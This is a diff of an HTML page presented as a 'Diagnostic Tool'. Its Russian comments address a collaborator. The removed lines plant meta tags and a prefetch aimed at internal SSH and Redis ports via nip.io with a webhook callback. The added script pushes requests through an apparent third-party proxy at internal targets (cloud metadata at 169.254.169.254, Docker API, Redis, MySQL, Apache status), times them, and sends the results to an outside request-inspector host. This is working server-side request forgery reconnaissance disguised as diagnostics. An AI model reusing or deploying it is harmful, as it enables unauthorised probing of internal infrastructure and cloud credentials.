@@ -2,18 +2,40 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Diagnostic Page</title>
-
-    <meta property="og:image" content="http://127.0.0.1.nip.io:22/favicon.ico?from_server=89.124.11.6&target=ssh&webhook=https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4">
-    
-    <meta property="og:image" content="http://127.0.0.1.nip.io:6379/logo.png?from_server=89.124.11.6&target=redis">
-
-    <link rel="prefetch" href="https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4/?log=server_visited_me">
+    <title>Diagnostic Tool</title>
 </head>
 <body>
     <script>
-        // Это остается для твоего браузера, чтобы ты видела, что страница жива
-        fetch("https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4/?log=browser_check");
+        (async function() {
+            // Твой новый адрес
+            const inspector = "https://01kghyewqpr6gac146mvj6nt9400-08f6870c60f820d7da1f.requestinspector.com";
+            const proxy = "https://max.ru/proxy?url=";
+            
+            const internalTargets = [
+                { name: "Metadata", url: "http://169.254.169.254.nip.io/latest/meta-data/" },
+                { name: "DockerAPI", url: "http://127.0.0.1.nip.io:2375/v1.24/containers/json" },
+                { name: "Redis", url: "http://127.0.0.1.nip.io:6379" },
+                { name: "MySQL", url: "http://127.0.0.1.nip.io:3306" },
+                { name: "ApacheStatus", url: "http://127.0.0.1.nip.io:80/server-status" }
+            ];
+
+            for (let t of internalTargets) {
+                const start = Date.now();
+                const cb = Math.random().toString(36).substring(7);
+                const finalUrl = `${proxy}${encodeURIComponent(t.url + "?cb=" + cb)}`;
+
+                try {
+                    await fetch(finalUrl, { mode: 'no-cors' });
+                } catch (e) {}
+
+                const duration = Date.now() - start;
+
+                // Отправляем на RequestInspector
+                // В инспекторе ищи параметры в Query String
+                fetch(`${inspector}?service=${t.name}&time=${duration}ms&status=success`);
+            }
+        })();
     </script>
+    <h1>Running network analysis... check your inspector.</h1>
 </body>
 </html>
